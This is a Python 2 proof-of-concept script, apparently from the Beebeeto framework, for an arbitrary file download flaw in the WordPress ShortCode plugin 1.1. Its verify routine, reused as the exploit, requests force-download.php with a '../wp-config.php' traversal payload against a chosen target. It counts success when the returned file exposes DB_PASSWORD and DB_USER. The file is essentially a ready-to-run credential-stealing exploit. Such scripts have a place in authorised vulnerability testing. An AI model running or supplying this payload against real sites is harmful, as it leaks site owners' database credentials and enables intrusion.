#!/usr/bin/env python
#coding:utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
    # poc相关信息
    'poc': {
        'id': 'poc-2014-0017',
        'name': 'WordPress ShortCode Plugin 1.1 - Local File Inclusion Vulnerability POC',
        'author': 'xidianlz',
        'create_date': '2014-09-22',
        },
    # 协议相关信息
    'protocol': {
        'name': 'http',
        'port': [80],
        'layer4_protocol': ['tcp'],
        },
    # 漏洞相关信息
    'vul': {
        'app_name': 'WordPress',
        'vul_version': ['1.1'],
        'type': 'Arbitrary File Download',
        'tag': ['WordPress', 'force-download.php', 'Arbitrary File Download'],
        'desc': 'WordPress shortcode 插件1.1版本存在任意文件下载漏洞',
        'references': ['http://sebug.net/vuldb/ssvid-87214',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        payload = "/wp/wp-content/force-download.php?file=../wp-config.php"
        vul_url = args["options"]["target"] + payload
        if args['options']['verbose']:
            print "[*] Request URL:", vul_url
        resp = urllib2.urlopen(vul_url)
        content = resp.read()
        if ("DB_PASSWORD" in content ) and ("DB_USER" in content):
            args["success"] = True
            args["poc_ret"]["vul_url"] = vul_url
            return args
        else:
            args["success"] = False
            return args

    exploit = verify

if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
